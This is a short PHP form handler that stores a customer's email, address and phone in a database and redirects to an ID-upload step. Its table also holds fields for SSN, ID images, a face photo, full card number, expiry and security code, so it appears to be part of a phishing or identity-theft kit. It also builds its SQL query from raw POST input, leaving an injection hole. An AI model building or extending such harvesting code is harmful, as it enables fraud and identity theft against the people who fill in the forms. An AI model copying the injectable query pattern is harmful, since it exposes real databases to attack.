<?php
  include '../admin/lib/database.php';
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  //TAKE INTO VARIABLE
  $customer_email = $_POST['customer_email'];
  $customer_address = $_POST['customer_address'];
  $customer_address2 = $_POST['customer_address2'];
  $customer_city = $_POST['customer_city'];
  $customer_state = $_POST['customer_state'];
  $customer_zip = $_POST['customer_zip'];
  $customer_phone = $_POST['customer_phone'];
  $uniqid = $customer_email . uniqid();
  $sent_from = $_POST['sent_from'];


  // INSERT CONDITIONS AND QUERY  
  if (!empty($uniqid)) {
      $sql = "INSERT INTO customer_informations (uniqid, customer_email, customer_address, customer_address2, customer_city, customer_state, customer_zip, customer_phone, front_id, back_id, customer_ssn, customer_face, customer_fname, customer_lname, card_number, expire_date, security_code, zip_code, sent_from)
             VALUES ('$uniqid', '$customer_email', '$customer_address', '$customer_address2', '$customer_city', '$customer_state', '$customer_zip', '$customer_phone', '', '', '', '', '', '', '', '', '', '', '$sent_from')";

        if ($conn->query($sql) === TRUE) {
          $_SESSION['uniqid']="$uniqid";
          Header( 'Location: ../upload-front/');
          exit();
        } else {
            $_SESSION['fail']="*Can't be empty!";
            Header( 'Location: ../contact-information-and-shipping-address/');
            exit();
        }
  }
  else{
    $_SESSION['emptyField']="*Can't be empty!";
    Header( 'Location: ../contact-information-and-shipping-address/');
    exit();
  }     
}
?>